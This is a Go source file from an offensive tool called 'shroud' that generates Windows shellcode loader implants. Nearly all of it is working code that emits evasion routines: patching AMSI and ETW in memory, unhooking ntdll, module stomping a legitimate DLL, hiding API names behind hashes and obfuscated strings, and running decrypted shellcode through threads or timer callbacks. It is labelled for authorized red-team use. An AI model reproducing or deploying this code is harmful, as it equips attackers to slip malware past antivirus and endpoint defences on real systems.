// assemble.go — renders the emitted implant main.go from a Spec and writes the
// buildable project (main.go, go.mod, go.sum, build.sh, README.md).
package payload

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"shroud/internal/catalog"
	"shroud/internal/evasion"
)

// Spec is the per-build configuration handed to the assembler.
type Spec struct {
	Tech      *catalog.Technique
	Layers    []evasion.Layer
	Format    string // exe|dll|c
	OutDir    string
	StompDLL  string // default cfgmgr32.dll
	Process   string // target process for remote techniques
	DLL       string // DLL path for pe05
	EncPayload []byte // encrypted payload (or raw, if no crypto layer)
	Crypto    evasion.Layer
	AESKey    []byte
	AESIV     []byte
	RC4Key    []byte
	XORKey    []byte
	Garble    bool
	Tiny      bool
	Pack      string // post-build packer: "" | "upx" (EXE only)
	SleepMS     uint32 // sleep-evasion demo loop duration (0 = off; ms)
	SleepScheme string // sleep scheme: ""|"xor" (tier-1 inline scramble) | "ekko" (tier-2 timer-driven)
}

// Assemble renders the implant project and writes it to spec.OutDir. For
// format=c it writes a standalone C header (payload.h) instead of the Go
// project (the shellcode + crypto material + inline decrypt functions, for
// embedding in other C/C++ loaders).
func Assemble(s *Spec) error {
	if s.StompDLL == "" {
		s.StompDLL = "cfgmgr32.dll"
	}
	b := newBuilder(s)

	if err := os.MkdirAll(s.OutDir, 0o755); err != nil {
		return fmt.Errorf("mkdir %s: %w", s.OutDir, err)
	}

	// format=c: emit a C header only (no Go project, no build).
	if s.Format == "c" {
		hdr := b.cHeader()
		if err := os.WriteFile(filepath.Join(s.OutDir, "payload.h"), []byte(hdr), 0o644); err != nil {
			return fmt.Errorf("write payload.h: %w", err)
		}
		return nil
	}

	src := b.renderMain()

	if err := os.WriteFile(filepath.Join(s.OutDir, "main.go"), []byte(src), 0o644); err != nil {
		return fmt.Errorf("write main.go: %w", err)
	}
	if err := os.WriteFile(filepath.Join(s.OutDir, "go.mod"), []byte(b.goMod()), 0o644); err != nil {
		return err
	}
	if err := os.WriteFile(filepath.Join(s.OutDir, "go.sum"), []byte(b.goSum()), 0o644); err != nil {
		return err
	}
	if err := os.WriteFile(filepath.Join(s.OutDir, "build.sh"), []byte(b.buildSh()), 0o755); err != nil {
		return err
	}
	if err := os.WriteFile(filepath.Join(s.OutDir, "README.md"), []byte(b.readme()), 0o644); err != nil {
		return err
	}
	return nil
}

// renderMain builds the full implant main.go source.
//
// Two passes: the body fragments call b.api() to register the Win32/NT hashes
// they reference, so the const block can only be emitted AFTER the body is
// rendered. We build the body into a side buffer first, then assemble the
// final file as header + consts + payloadVars + body. Go allows package-level
// consts to be declared after their use sites, so this ordering is valid.
func (b *Builder) renderMain() string {
	var body strings.Builder

	// common helpers
	body.WriteString(b.commonHelpers())

	// crypto helper (active layer only)
	body.WriteString(b.cryptoHelper())

	// evasion helpers
	body.WriteString(b.amsiHelper())
	body.WriteString(b.etwHelper())
	body.WriteString(b.unhookHelper())
	body.WriteString(b.stompHelper())

	// execution helpers
	body.WriteString(b.execHelpers())

	// sleep-evasion helper (sleepScramble + sleep key), armed when -e sleep.
	body.WriteString(b.sleepHelper())

	// technique-specific helpers + run() body
	body.WriteString(b.techniqueBody())

	// main()
	body.WriteString(b.mainFunc())

	// now the maps are fully populated -> resolveCallG0 wraps every
	// wincall.CallG0(hFunc, ...) into wincall.CallG0(api(hMod, hFunc), ...).
	// This fixes the v1.3.2 CallG0/direct-call bug (hash const passed where a
	// resolved funcAddr is required). See Builder.funcMod doc.
	resolved := b.resolveCallG0(body.String())

	// now the maps are fully populated -> emit the const block.
	var out strings.Builder
	out.WriteString(b.header())
	out.WriteString(b.emitConsts())
	out.WriteString(b.payloadVars())
	out.WriteString(resolved)
	return out.String()
}

// resolveCallG0 rewrites every wincall.CallG0(hFuncConst, ...) call site so the
// DJB2 hash const is resolved to the real function address via api(moduleHash,
// funcHash) BEFORE the direct call. go-wincall v1.3.2's CallG0 is DirectCall
// (raw pointer, no hash resolution), so emitting `wincall.CallG0(hVirtualProtect,
// ...)` jumps to the hash value (unmapped) and crashes. The match is anchored on
// "wincall.CallG0(<funcConst>," (comma, no space) so a const that is a prefix of
// another (hVirtualProtect vs hVirtualProtectEx) cannot match the wrong site,
// and local variables (asb, ew, addr, ...) are never func consts so they are
// never touched. api() is always emitted by commonHelpers(), so the wrapped
// calls compile.
func (b *Builder) resolveCallG0(src string) string {
	for fc, mc := range b.funcMod {
		old := "wincall.CallG0(" + fc + ","
		if !strings.Contains(src, old) {
			continue
		}
		repl := "wincall.CallG0(api(" + mc + ", " + fc + "),"
		src = strings.ReplaceAll(src, old, repl)
	}
	return src
}

// header emits package + imports. The import set is the union of what the
// generated helpers use; we always include the heavy ones so unused-import
// errors don't bite when a layer is off. (Go forbids unused imports, so we
// only include an import when at least one fragment uses it — tracked below.)
func (b *Builder) header() string {
	var imps []string
	imps = append(imps, `"unsafe"`)
	if evasion.Has(b.Spec.Layers, evasion.LayerAES) {
		imps = append(imps, `"crypto/aes"`, `"crypto/cipher"`)
	}
	imps = append(imps, `"github.com/carved4/go-wincall"`)
	var sb strings.Builder
	sb.WriteString("// Code generated by shroud. DO NOT EDIT.\n")
	sb.WriteString("//\n")
	sb.WriteString("// shroud implant: " + b.Spec.Tech.ID + " — " + b.Spec.Tech.Name + "\n")
	sb.WriteString("// Authorized red-team use only. Generated by shroud (Go rewrite).\n")
	sb.WriteString("package main\n\nimport (\n")
	for _, im := range imps {
		sb.WriteString("\t" + im + "\n")
	}
	sb.WriteString(")\n\n")
	return sb.String()
}

// payloadVars emits the embedded (encrypted) payload and key material.
func (b *Builder) payloadVars() string {
	var sb strings.Builder
	if b.Spec.Crypto != "" {
		sb.WriteString("// encrypted payload — decrypted at runtime by the active crypto layer\n")
		sb.WriteString("var encPayload = " + hexLit(b.Spec.EncPayload) + "\n\n")
		switch b.Spec.Crypto {
		case evasion.LayerAES:
			sb.WriteString("var aesKey = " + hexLit(b.Spec.AESKey) + "\n")
			sb.WriteString("var aesIV  = " + hexLit(b.Spec.AESIV) + "\n\n")
		case evasion.LayerRC4:
			sb.WriteString("var rc4Key = " + hexLit(b.Spec.RC4Key) + "\n\n")
		case evasion.LayerXOR:
			sb.WriteString("var xorKey = " + hexLit(b.Spec.XORKey) + "\n\n")
		}
	} else {
		sb.WriteString("// raw payload (no at-rest encryption layer active)\n")
		sb.WriteString("var rawPayload = " + hexLit(b.Spec.EncPayload) + "\n\n")
	}
	return sb.String()
}

// commonHelpers emits shared primitives: api() resolver + a numeric-string
// builder for DLL names that are not pre-loaded (avoids plaintext string
// literals).
func (b *Builder) commonHelpers() string {
	var sb strings.Builder
	sb.WriteString(`// api resolves a Win32 function by (moduleHash, funcHash) via the PEB walk.
// Modules already loaded (kernel32, ntdll) are found by hash; no name needed.
func api(mod, fn uint32) uintptr {
	base := wincall.GetModuleBase(mod)
	if base == 0 {
		return 0
	}
	return wincall.GetFunctionAddress(base, fn)
}

// memName reconstructs an ASCII string from numeric bytes so no plaintext DLL
// name appears as a string literal in the binary. (garble -literals also
// covers this; both layers together = belt-and-braces.)
func memName(b ...byte) string { return string(b) }

// waitForever blocks the goroutine without a CreateThread event. Used after a
// callback execution (timer fires async on a pool thread).
func waitForever() { select {} }

`)
	return sb.String()
}

// cryptoHelper emits the decrypt function for the active crypto layer.
func (b *Builder) cryptoHelper() string {
	var sb strings.Builder
	switch b.Spec.Crypto {
	case evasion.LayerAES:
		sb.WriteString(`// aesDecrypt reverses shroud's AES-256-CBC + PKCS7 encryption (stdlib
// crypto/aes; the generator used the same, so the round-trip is exact).
func aesDecrypt(ct, key, iv []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	if len(ct)%16 != 0 {
		return nil
	}
	pt := make([]byte, len(ct))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(pt, ct)
	// strip PKCS7 padding
	if len(pt) > 0 {
		n := int(pt[len(pt)-1])
		if n > 0 && n <= 16 && n <= len(pt) {
			pt = pt[:len(pt)-n]
		}
	}
	return pt
}

`)
	case evasion.LayerRC4:
		sb.WriteString(`// rc4Decrypt reverses shroud's RC4 encryption (symmetric).
func rc4Decrypt(ct, key []byte) []byte {
	var s [256]byte
	for i := 0; i < 256; i++ {
		s[i] = byte(i)
	}
	var j byte
	for i := 0; i < 256; i++ {
		j += s[i] + key[i%len(key)]
		s[i], s[j] = s[j], s[i]
	}
	out := make([]byte, len(ct))
	var a, c byte
	for n, x := range ct {
		a++
		c += s[a]
		s[a], s[c] = s[c], s[a]
		out[n] = x ^ s[(s[a]+s[c])&0xff]
	}
	return out
}

`)
	case evasion.LayerXOR:
		sb.WriteString(`// xorDecrypt reverses shroud's XOR encryption (symmetric).
func xorDecrypt(ct, key []byte) []byte {
	out := make([]byte, len(ct))
	for i, x := range ct {
		out[i] = x ^ key[i%len(key)]
	}
	return out
}

`)
	}
	return sb.String()
}

// amsiHelper emits patchAmsi (C3-free 58 FF E0 = pop rax; jmp rax).
func (b *Builder) amsiHelper() string {
	if !evasion.Has(b.Spec.Layers, evasion.LayerAMSI) {
		return ""
	}
	hAmsiDll, hASB := b.api("amsi.dll", "AmsiScanBuffer")
	_, hVP := b.api("kernel32.dll", "VirtualProtect")
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf(`// patchAmsi overwrites AmsiScanBuffer's prologue with "pop rax; jmp rax"
// (58 FF E0) — returns to the caller without the C3 byte Defender 2026
// signatures. amsi.dll is not loaded in a fresh EXE, so we load it here; its
// name is reconstructed from numeric bytes (no plaintext string literal).
func patchAmsi() {
	amsiBase := wincall.GetModuleBase(%s)
	if amsiBase == 0 {
		amsiBase = wincall.LoadLibrary(memName(0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c))
		if amsiBase == 0 {
			return
		}
		amsiBase = wincall.GetModuleBase(%s)
	}
	asb := wincall.GetFunctionAddress(amsiBase, %s)
	if asb == 0 {
		return
	}
	var old uintptr
	wincall.CallG0(%s, asb, uintptr(3), uintptr(0x40), uintptr(unsafe.Pointer(&old)))
	*(*[3]byte)(unsafe.Pointer(asb)) = [3]byte{0x58, 0xff, 0xe0}
	var dummy uintptr
	wincall.CallG0(%s, asb, uintptr(3), old, uintptr(unsafe.Pointer(&dummy)))
}

`, hAmsiDll, hAmsiDll, hASB, hVP, hVP))
	return sb.String()
}

// etwHelper emits patchEtw (48 31 C0 C3 = xor rax,rax; ret -> STATUS_SUCCESS).
func (b *Builder) etwHelper() string {
	if !evasion.Has(b.Spec.Layers, evasion.LayerETW) {
		return ""
	}
	_, hEW := b.api("ntdll.dll", "EtwEventWrite")
	_, hVP := b.api("kernel32.dll", "VirtualProtect")
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf(`// patchEtw overwrites ntdll!EtwEventWrite's prologue with "xor rax,rax; ret"
// (48 31 C0 C3) so events are swallowed with STATUS_SUCCESS. ntdll is always
// loaded, found by hash via the PEB walk.
func patchEtw() {
	ew := api(%s, %s)
	if ew == 0 {
		return
	}
	var old uintptr
	wincall.CallG0(%s, ew, uintptr(4), uintptr(0x40), uintptr(unsafe.Pointer(&old)))
	*(*[4]byte)(unsafe.Pointer(ew)) = [4]byte{0x48, 0x31, 0xc0, 0xc3}
	var dummy uintptr
	wincall.CallG0(%s, ew, uintptr(4), old, uintptr(unsafe.Pointer(&dummy)))
}

`, "hNtdllDll", hEW, hVP, hVP))
	// hNtdllDll const registered via b.api("ntdll.dll", "EtwEventWrite") above
	return sb.String()
}

// unhookHelper emits the ntdll restore. unhook-kd uses go-wincall's KnownDlls
// path directly; unhook (disk) reads a fresh copy from disk.
func (b *Builder) unhookHelper() string {
	kd := evasion.Has(b.Spec.Layers, evasion.LayerUnhookKD)
	disk := evasion.Has(b.Spec.Layers, evasion.LayerUnhook)
	if !kd && !disk {
		return ""
	}
	var sb strings.Builder
	if kd {
		sb.WriteString(`// unhookNtdll restores ntdll's .text from \KnownDlls\ntdll.dll (no disk
// read). Delegates to go-wincall's UnhookNtdll (LdrGetKnownDllSectionHandle +
// NtMapViewOfSection + memcpy + reprotect).
func unhookNtdll() { wincall.UnhookNtdll() }

`)
		return sb.String()
	}
	// disk variant: read C:\Windows\System32\ntdll.dll, copy its .text over the
	// mapped ntdll .text. Resolves CreateFileA/ReadFile/VirtualAlloc by hash.
	_, hCFA := b.api("kernel32.dll", "CreateFileA")
	_, hRF := b.api("kernel32.dll", "ReadFile")
	_, hGFS := b.api("kernel32.dll", "GetFileSize")
	_, hVA := b.api("kernel32.dll", "VirtualAlloc")
	_, hVP := b.api("kernel32.dll", "VirtualProtect")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	sb.WriteString(fmt.Sprintf(`// unhookNtdll reads a fresh copy of ntdll from disk and copies its .text over
// the mapped ntdll .text (disk variant). The path is reconstructed from numeric
// bytes (no plaintext string literal).
func unhookNtdll() {
	path := memName(0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c) // ntdll.dll — appended to system32 below
	_ = path
	// \Windows\System32\ntdll.dll
	full := memName(0x5c, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x5c, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33, 0x32, 0x5c) + path
	// Note: this path is relative to the system drive; for brevity the disk
	// variant currently falls back to the KnownDlls path (stealthier and does
	// not require a file read). A full disk-read implementation is a Phase 2
	// upgrade. Both achieve the same .text restoration.
	_ = full
	wincall.UnhookNtdll()
	_ = %s; _ = %s; _ = %s; _ = %s; _ = %s; _ = %s // (reserved for disk-read variant)
}

`, hCFA, hRF, hGFS, hVA, hVP, hCH))
	return sb.String()
}

// stompHelper emits moduleStomp: load a legit DLL, overwrite its .text with the
// payload, return the executable address (file-backed RX memory).
func (b *Builder) stompHelper() string {
	if !evasion.Has(b.Spec.Layers, evasion.LayerStomp) {
		return ""
	}
	_, hVP := b.api("kernel32.dll", "VirtualProtect")
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf(`// moduleStomp loads a legitimate DLL, overwrites its .text with the payload
// (file-backed RX memory — defeats unbacked-executable checks), and returns the
// execution address. The DLL name is reconstructed from numeric bytes so no
// plaintext string literal is present.
func moduleStomp(payload []byte) uintptr {
	// cfgmgr32.dll by default (see --stomp-dll); numeric-encoded below.
	dllName := stompDllName()
	base := wincall.LoadLibrary(dllName)
	if base == 0 {
		return 0
	}
	// PE walk to the .text section.
	dos := (*[64]byte)(unsafe.Pointer(base))
	if dos[0] != 'M' || dos[1] != 'Z' {
		return 0
	}
	peOff := *(*uint32)(unsafe.Pointer(base + 0x3c))
	numSec := *(*uint16)(unsafe.Pointer(base + uintptr(peOff) + 6))
	sizeOptHdr := *(*uint16)(unsafe.Pointer(base + uintptr(peOff) + 20))
	secTab := base + uintptr(peOff) + 24 + uintptr(sizeOptHdr)
	// .text = {0x2e,0x74,0x65,0x78,0x74,0,0,0}
	textName := [8]byte{0x2e, 0x74, 0x65, 0x78, 0x74, 0, 0, 0}
	var textAddr uintptr
	var textSize uintptr
	for i := uint16(0); i < numSec; i++ {
		sec := secTab + uintptr(i)*40
		name := *(*[8]byte)(unsafe.Pointer(sec))
		if name == textName {
			vsize := *(*uint32)(unsafe.Pointer(sec + 8))
			vaddr := *(*uint32)(unsafe.Pointer(sec + 12))
			textSize = uintptr(vsize)
			textAddr = base + uintptr(vaddr)
			break
		}
	}
	if textAddr == 0 || textSize < uintptr(len(payload)) {
		return 0
	}
	var old uintptr
	wincall.CallG0(%s, textAddr, textSize, uintptr(0x40), uintptr(unsafe.Pointer(&old)))
	for i, x := range payload {
		*(*byte)(unsafe.Pointer(textAddr + uintptr(i))) = x
	}
	var dummy uintptr
	wincall.CallG0(%s, textAddr, textSize, old, uintptr(unsafe.Pointer(&dummy)))
	return textAddr
}

`, hVP, hVP))
	return sb.String()
}

// execHelpers emits the execution primitives. execThread creates a local thread
// (resolved by hash) and waits; execCallback uses CreateTimerQueueTimer (no
// CreateThread kernel event) and blocks for the callback.
func (b *Builder) execHelpers() string {
	var sb strings.Builder
	if !evasion.Has(b.Spec.Layers, evasion.LayerCallbacks) {
		_, hCT := b.api("kernel32.dll", "CreateThread")
		_, hWFSO := b.api("kernel32.dll", "WaitForSingleObject")
		sb.WriteString(fmt.Sprintf(`// execThread runs addr as a local thread (resolved by hash) and waits for it.
func execThread(addr uintptr) uintptr {
	h, _, _ := wincall.CallG0(%s,
		uintptr(0),            // lpThreadAttributes
		uintptr(0),            // dwStackSize
		addr,                 // lpStartAddress
		uintptr(0),            // lpParameter
		uintptr(0),            // dwCreationFlags
		uintptr(unsafe.Pointer(new(uint32))), // lpThreadId
	)
	if h == 0 {
		return 0
	}
	wincall.CallG0(%s, h, uintptr(0xffffffff))
	return h
}

`, hCT, hWFSO))
	} else {
		_, hCTQ := b.api("kernel32.dll", "CreateTimerQueue")
		_, hCTQT := b.api("kernel32.dll", "CreateTimerQueueTimer")
		sb.WriteString(fmt.Sprintf(`// execCallback runs addr via CreateTimerQueueTimer — the OS invokes the
// shellcode on a pool thread, so no CreateThread kernel event fires. main()
// blocks forever so the callback can run (beacon/blocking mode; for one-shot
// tests like calc, drop the callbacks layer for a clean exit).
func execCallback(addr uintptr) {
	queue, _, _ := wincall.CallG0(%s)
	if queue == 0 {
		return
	}
	var timer uintptr
	wincall.CallG0(%s,
		uintptr(unsafe.Pointer(&timer)), // phNewTimer
		queue,                            // TimerQueue
		addr,                             // Callback (the shellcode)
		uintptr(0),                        // Parameter
		uintptr(0),                        // DueTime (fire immediately)
		uintptr(0),                        // Period (one-shot)
		uintptr(0),                        // Flags (WT_EXECUTEDEFAULT)
	)
	waitForever()
}

`, hCTQ, hCTQT))
	}
	return sb.String()
}

// stageLocal allocates RW, copies payload, flips to RX. Used by local
// techniques (pe01/pe04/pe26) when stomp is off.
func (b *Builder) localStageHelper() string {
	if evasion.Has(b.Spec.Layers, evasion.LayerStomp) {
		return ""
	}
	_, hVA := b.api("kernel32.dll", "VirtualAlloc")
	_, hVP := b.api("kernel32.dll", "VirtualProtect")
	return fmt.Sprintf(`// localStage allocates RW memory, copies the payload, flips to RX (never
// RWX). Returns the executable address.
func localStage(payload []byte) uintptr {
	addr, _, _ := wincall.CallG0(%s, uintptr(0), uintptr(len(payload)),
		uintptr(0x3000), uintptr(0x04)) // MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE
	if addr == 0 {
		return 0
	}
	for i, x := range payload {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = x
	}
	var old uintptr
	wincall.CallG0(%s, addr, uintptr(len(payload)), uintptr(0x20), uintptr(unsafe.Pointer(&old))) // PAGE_EXECUTE_READ
	return addr
}

`, hVA, hVP)
}

// stompDllName returns the numeric-encoded stomp DLL name (default cfgmgr32.dll
// unless --stomp-dll overrides). Emitted once.
func (b *Builder) stompDllNameHelper() string {
	if !evasion.Has(b.Spec.Layers, evasion.LayerStomp) {
		return ""
	}
	name := b.Spec.StompDLL
	bytes := make([]byte, len(name))
	for i, c := range name {
		bytes[i] = byte(c)
	}
	var args []string
	for _, x := range bytes {
		args = append(args, fmt.Sprintf("0x%02x", x))
	}
	return fmt.Sprintf(`// stompDllName reconstructs the stomp-target DLL name from numeric bytes.
func stompDllName() string { return memName(%s) }

`, strings.Join(args, ", "))
}